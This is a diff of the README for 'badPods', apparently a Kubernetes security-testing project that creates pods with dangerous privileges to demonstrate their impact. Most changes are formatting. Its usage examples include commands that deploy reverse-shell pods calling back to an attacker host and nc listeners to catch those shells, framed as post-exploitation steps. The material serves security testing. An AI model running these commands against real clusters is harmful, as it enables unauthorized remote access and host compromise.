@@ -1,6 +1,6 @@
 # badPods
 
-A collection of manifests that create pods with different elevated privileges, like `hostNetwork`, `hostPID`, and `privileged`. Quickly demonstrate the impact of allowing security sensitive pod attributes. 
+A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like `hostNetwork`, `hostPID`, `hostPath`, `hostIPC`, and `privileged`. 
 
 ## Background 
 Check out blog post here
@@ -34,7 +34,7 @@ Check out blog post here
    * 8 resource types that can create pods (pod, deployment, replicaset, statefulset, etc.)
    * 2 ways to access the created pods (exec & reverse shell)
 
-```bash
+```
 ├── manifests
 │   ├── everything-allowed
 │   │   ├── cronjob
@@ -83,7 +83,7 @@ Each resource in the `manifests` directory targets a specific attribute or a com
 ## High level approach
 
 #### Option 1: Methodical approach
-1. **Evaluate RBAC** - Determine what resource types you can create
+1. **Evaluate RBAC** - Determine which resource types you can create 
 1. **Evaluate Admission Policy** - Determine which of the badPods you will be able to create
 1. **Create Resources** - Based on what is allowed, use the specific badPod type and resource type and create your resources
 1. **Post Exploitation** - Evaluate post exploitation steps outlined in the README for that type
@@ -93,7 +93,7 @@ Each resource in the `manifests` directory targets a specific attribute or a com
 1. **Post Exploitation** - For any created pods, evaluate post exploitation steps outlined in the README for that type
 
 
-## Common Usage Examples
+## Usage Examples
 
 * [Create all eight badPods](#Create-all-eight-badPods-if-the-admission-controller-allows-it)
 * [Create all eight revsere shell badPods](#Create-all-eight-revsere-shell-badPods)
@@ -104,7 +104,7 @@ Each resource in the `manifests` directory targets a specific attribute or a com
 
 
 ### Create all eight badPods (if the admission controller allows it)
-```bash
+```
 kubectl apply -f ./manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
 kubectl apply -f ./manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
 kubectl apply -f ./manifests/priv/pod/priv-exec-pod.yaml
@@ -114,11 +114,10 @@ kubectl apply -f ./manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
 kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
 kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
 ```
-
 ### Create all eight revsere shell badPods
 To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
 
-```bash
+```
 HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
@@ -129,14 +128,12 @@ HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv
 HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
 ```
 ### Create a cronjob with the hostNetwork pod
-```bash
+```
 kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
- 
-cronjob.batch/hostnetwork-exec-cronjob created
 ```
 
 Find the created pod
-```bash
+```
 kubectl get pods | grep cronjob
  
 NAME                                        READY   STATUS    RESTARTS   AGE
@@ -144,30 +141,28 @@ hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
 ```
 
 Exec into pod
-```bash
+```
 kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
 ```
 
 ### Create a deployment with the priv-and-hostpid pod
-```bash
+```
 kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
- 
-deployment.apps/priv-and-hostpid-exec-deployment created
 ```
 Find the created pod
-```bash
+```
 kubectl get pods | grep deployment
 
 priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
 priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
 ```
 Exec into pod
-```bash
+```
 kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ```
 
 ### Create all eight resource types using the everything-allowed pod
-```bash
+```
 find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
 
 cronjob.batch/everything-allowed-exec-cronjob created
@@ -182,7 +177,7 @@ statefulset.apps/everything-allowed-exec-statefulset created
 ```
 
 View all of the created pods
-```bash
+```
 kubectl get pods
 
 NAME                                                  READY   STATUS    RESTARTS   AGE
@@ -199,22 +194,22 @@ everything-allowed-exec-statefulset-0                 1/1     Running   0       
 everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
 ```
 Delete all everything-allowed resources
-```bash
+```
 find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl delete -f {} \;
 ```
 
 ### Create a reverse shell using the privileged pod
 Set up listener
-```bash
+```
 nc -nvlp 3116
 ```
 
 Create pod from local yaml without modifying it by using env variables and envsubst
-```bash
+```
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
 ```
 Catch the shell 
-```bash
+```
 nc -nvlp 3116
 Listening on 0.0.0.0 3116
 
